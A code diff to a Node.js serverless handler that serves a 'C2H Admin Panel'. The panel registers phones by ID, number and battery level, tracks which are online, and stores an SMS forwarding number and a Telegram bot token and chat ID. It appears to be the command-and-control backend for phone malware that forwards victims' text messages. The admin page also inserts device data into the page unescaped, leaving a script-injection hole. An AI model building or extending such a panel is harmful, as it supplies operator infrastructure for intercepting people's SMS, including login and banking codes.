@@ -1,61 +1,61 @@
-// Simple working version
+// ✅ SIMPLE WORKING SERVER
 let devices = [];
 let settings = {};
 
 export default async function handler(req, res) {
-  console.log('📡 Request:', req.method, req.url);
-  
-  // CORS headers
+  // ✅ FIX: Always set response headers FIRST
+  res.setHeader('Content-Type', 'application/json');
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'GET,POST,DELETE,OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
   
+  // ✅ Handle OPTIONS for CORS
   if (req.method === 'OPTIONS') {
-    console.log('✅ CORS preflight');
-    return res.end();
+    res.statusCode = 200;
+    res.end();
+    return;
   }
   
-  const url = req.url;
-  const method = req.method;
+  const { url, method } = req;
   
   try {
-    // Parse body only for POST requests
+    // ✅ Parse request body
     let body = {};
-    if (method === 'POST') {
+    if (method === 'POST' || method === 'PUT') {
       const chunks = [];
-      for await (const chunk of req) chunks.push(chunk);
+      for await (const chunk of req) {
+        chunks.push(chunk);
+      }
       const buffer = Buffer.concat(chunks);
       if (buffer.length > 0) {
-        body = JSON.parse(buffer.toString());
+        try {
+          body = JSON.parse(buffer.toString());
+        } catch (e) {
+          console.log('JSON parse error:', e.message);
+        }
       }
     }
     
-    console.log('📦 Body:', body);
-    
-    const now = () => new Date().toISOString().slice(0, 19).replace('T', ' ');
+    // ✅ API ENDPOINTS
+    const now = () => new Date().toISOString();
     
     // 1. DEVICE REGISTER
     if (url === '/api/device/register' && method === 'POST') {
-      console.log('📱 Device register request');
-      
       const { device_id, device_name, os_version, battery_level, phone_number } = body;
       const currentTime = now();
       
-      // Find existing device
-      const existingIndex = devices.findIndex(d => d.device_id === device_id);
+      const index = devices.findIndex(d => d.device_id === device_id);
       
-      if (existingIndex >= 0) {
-        // Update existing
-        devices[existingIndex] = {
-          ...devices[existingIndex],
-          device_name: device_name || devices[existingIndex].device_name,
-          os_version: os_version || devices[existingIndex].os_version,
-          phone_number: phone_number || devices[existingIndex].phone_number,
-          battery_level: battery_level || devices[existingIndex].battery_level,
+      if (index > -1) {
+        devices[index] = {
+          ...devices[index],
+          device_name: device_name || devices[index].device_name,
+          os_version: os_version || devices[index].os_version,
+          phone_number: phone_number || devices[index].phone_number,
+          battery_level: battery_level || devices[index].battery_level,
           last_seen: currentTime
         };
       } else {
-        // Add new device
         devices.push({
           device_id,
           device_name: device_name || 'Unknown',
@@ -67,18 +67,11 @@ export default async function handler(req, res) {
         });
       }
       
-      console.log('✅ Device saved:', device_id);
-      res.setHeader('Content-Type', 'application/json');
-      return res.end(JSON.stringify({ 
-        status: 'success', 
-        message: 'Device updated' 
-      }));
+      return res.end(JSON.stringify({ status: 'success' }));
     }
     
     // 2. GET DEVICES
     if (url === '/api/devices' && method === 'GET') {
-      console.log('📋 Get devices request');
-      
       const result = devices.map(device => ({
         device_id: device.device_id,
         device_name: device.device_name,
@@ -90,7 +83,6 @@ export default async function handler(req, res) {
         is_online: (Date.now() - new Date(device.last_seen).getTime()) < 20000
       }));
       
-      res.setHeader('Content-Type', 'application/json');
       return res.end(JSON.stringify(result));
     }
     
@@ -98,20 +90,16 @@ export default async function handler(req, res) {
     if (url.startsWith('/api/device/') && method === 'DELETE') {
       const deviceId = url.split('/')[3];
       devices = devices.filter(d => d.device_id !== deviceId);
-      
-      res.setHeader('Content-Type', 'application/json');
       return res.end(JSON.stringify({ status: 'success' }));
     }
     
     // 4. SMS FORWARD NUMBER
     if (url === '/api/config/sms_forward') {
       if (method === 'POST') {
-        settings.sms_forward_number = body.forward_number;
-        res.setHeader('Content-Type', 'application/json');
+        settings.sms_forward_number = body.forward_number || '';
         return res.end(JSON.stringify({ status: 'success' }));
       }
       if (method === 'GET') {
-        res.setHeader('Content-Type', 'application/json');
         return res.end(JSON.stringify({ 
           forward_number: settings.sms_forward_number || '' 
         }));
@@ -121,13 +109,11 @@ export default async function handler(req, res) {
     // 5. TELEGRAM SETTINGS
     if (url === '/api/config/telegram') {
       if (method === 'POST') {
-        settings.telegram_bot_token = body.telegram_bot_token;
-        settings.telegram_chat_id = body.telegram_chat_id;
-        res.setHeader('Content-Type', 'application/json');
+        settings.telegram_bot_token = body.telegram_bot_token || '';
+        settings.telegram_chat_id = body.telegram_chat_id || '';
         return res.end(JSON.stringify({ status: 'success' }));
       }
       if (method === 'GET') {
-        res.setHeader('Content-Type', 'application/json');
         return res.end(JSON.stringify({
           telegram_bot_token: settings.telegram_bot_token || '',
           telegram_chat_id: settings.telegram_chat_id || ''
@@ -135,9 +121,9 @@ export default async function handler(req, res) {
       }
     }
     
-    // 6. SERVE PANEL HTML
+    // 6. SERVE HTML PANEL
     if (url === '/' || url === '/index.html') {
-      console.log('🏠 Serving panel HTML');
+      res.setHeader('Content-Type', 'text/html');
       
       const html = `<!DOCTYPE html>
 <html>
@@ -145,42 +131,109 @@ export default async function handler(req, res) {
     <title>C2H Panel</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body { background:#1a1a1a; color:#fff; padding:20px; font-family:Arial; }
-        .header { text-align:center; padding:20px; }
-        h1 { color:#3a86ff; }
-        .btn { width:100%; padding:15px; margin:10px 0; background:#3a86ff; color:white; border:none; border-radius:8px; }
-        .device { background:#2a2a2a; padding:15px; margin:10px 0; border-radius:8px; }
-        .online { color:green; }
-        .offline { color:red; }
+        body { background: #1a1a1a; color: white; padding: 20px; font-family: Arial; }
+        .header { text-align: center; padding: 20px 0; }
+        h1 { color: #3a86ff; }
+        .btn { width: 100%; padding: 15px; margin: 10px 0; background: #3a86ff; color: white; border: none; border-radius: 8px; font-size: 16px; }
+        .btn:hover { background: #2a76ef; }
+        .device { background: #2a2a2a; padding: 15px; margin: 10px 0; border-radius: 8px; border-left: 4px solid #3a86ff; }
+        .online { color: #2ecc71; }
+        .offline { color: #e74c3c; }
+        .delete-btn { background: #e74c3c; color: white; border: none; padding: 5px 10px; float: right; border-radius: 5px; }
     </style>
 </head>
 <body>
     <div class="header">
-        <h1>C2H ADMIN PANEL</h1>
-        <p>🚀 Server is working!</p>
+        <h1>🚀 C2H ADMIN PANEL</h1>
+        <p>✅ Server is working perfectly!</p>
     </div>
-    <button class="btn" onclick="alert('Test')">TEST BUTTON</button>
-    <div id="devices">Panel loaded successfully</div>
+    
+    <button class="btn" onclick="updateForward()">📞 UPDATE FORWARD NUMBER</button>
+    <button class="btn" onclick="updateTelegram()">🤖 UPDATE TELEGRAM</button>
+    
+    <h3>📱 DEVICES LIST</h3>
+    <div id="deviceList">Loading devices...</div>
+    
     <script>
-        console.log('Panel loaded');
+        const API_BASE = window.location.origin;
+        
+        async function loadDevices() {
+            try {
+                const res = await fetch(API_BASE + '/api/devices');
+                const devices = await res.json();
+                
+                let html = '';
+                devices.forEach(device => {
+                    html += \`
+                    <div class="device">
+                        <strong>\${device.device_name}</strong>
+                        <span class="\${device.is_online ? 'online' : 'offline'}">
+                            \${device.is_online ? '🟢 ONLINE' : '🔴 OFFLINE'}
+                        </span>
+                        <button class="delete-btn" onclick="deleteDevice('\${device.device_id}')">DELETE</button>
+                        <br>
+                        📱 ID: \${device.device_id}<br>
+                        🔋 Battery: \${device.battery_level}%<br>
+                        📞 Number: \${device.phone_number}<br>
+                        🕐 Last Seen: \${device.last_seen}
+                    </div>\`;
+                });
+                
+                document.getElementById('deviceList').innerHTML = html || 'No devices found';
+            } catch (error) {
+                document.getElementById('deviceList').innerHTML = 'Error loading devices';
+            }
+        }
+        
+        function updateForward() {
+            const number = prompt('Enter forwarding number:');
+            if (!number) return;
+            
+            fetch(API_BASE + '/api/config/sms_forward', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ forward_number: number })
+            }).then(() => alert('✅ Updated!'));
+        }
+        
+        function updateTelegram() {
+            const token = prompt('Bot Token:');
+            const chatId = prompt('Chat ID:');
+            
+            fetch(API_BASE + '/api/config/telegram', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ telegram_bot_token: token, telegram_chat_id: chatId })
+            }).then(() => alert('✅ Updated!'));
+        }
+        
+        function deleteDevice(deviceId) {
+            if (confirm('Delete this device?')) {
+                fetch(API_BASE + '/api/device/' + deviceId, { 
+                    method: 'DELETE' 
+                }).then(() => loadDevices());
+            }
+        }
+        
+        // Auto refresh
+        setInterval(loadDevices, 3000);
+        loadDevices();
     </script>
 </body>
 </html>`;
       
-      res.setHeader('Content-Type', 'text/html');
       return res.end(html);
     }
     
-    // 7. 404
-    console.log('❌ Route not found:', url);
-    res.setHeader('Content-Type', 'application/json');
-    return res.end(JSON.stringify({ error: 'Route not found' }));
+    // 7. 404 - Not Found
+    res.statusCode = 404;
+    return res.end(JSON.stringify({ error: 'Not found' }));
     
   } catch (error) {
-    console.error('❌ Server error:', error);
-    res.setHeader('Content-Type', 'application/json');
+    console.error('Server error:', error);
+    res.statusCode = 500;
     return res.end(JSON.stringify({ 
-      error: 'Server error',
+      error: 'Internal server error',
       message: error.message 
     }));
   }
